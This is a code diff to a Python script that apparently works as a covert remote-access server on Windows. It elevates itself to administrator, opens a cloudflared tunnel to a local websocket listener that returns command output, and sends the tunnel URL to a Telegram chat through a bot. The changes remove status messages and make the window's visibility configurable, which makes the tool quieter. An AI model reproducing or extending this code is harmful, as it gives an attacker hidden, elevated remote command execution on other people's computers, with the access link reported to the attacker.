@@ -2,11 +2,13 @@ from re import search
 from ctypes import windll
 from os import getcwd, chdir
 from websockets import serve
+from asyncio import run as async_run
 from asyncio import Future, to_thread
 from sys import executable, argv, exit
 from subprocess import Popen, PIPE, STDOUT, run
+try: from src.config import Config
+except ImportError: from config import Config
 
-from src.config import Config
 
 class Server(Config):
     def __init__(self):
@@ -58,7 +60,6 @@ class Server(Config):
             await websocket.send(output or "")
 
     def create_tunnel(self):
-        print("Initializing the tunnel...")
         process = Popen(
             ["cloudflared", "tunnel", "--url", f"http://localhost:{self.port}"],
             stdout=PIPE,
@@ -84,24 +85,19 @@ class Server(Config):
                 "runas",
                 executable,
                 " ".join(argv),
-                None, 0
-                #int("--silent" not in argv)
-            )
-            exit()
+                None,
+                self.visibility
+            ); exit(0)
 
-        # Проверяем cloudflared
         if not self.ensure_cloudflared():
-            print("Failed to install cloudflared.")
-            exit()
+            exit("Failed to install cloudflared.")
 
-        # Создаём туннель
         if self.create_tunnel():
-            print("Tunnel:", self.url)
-
             await self.bot.send_message(self.chat_id, self.url)
             await self.bot.session.close()
 
-            print(f"The message was sent to ID: {self.chat_id}")
-
             async with serve(self.listener, self.host, self.port):
                 await Future()
+
+if __name__ == "__main__":
+    async_run(Server().run())
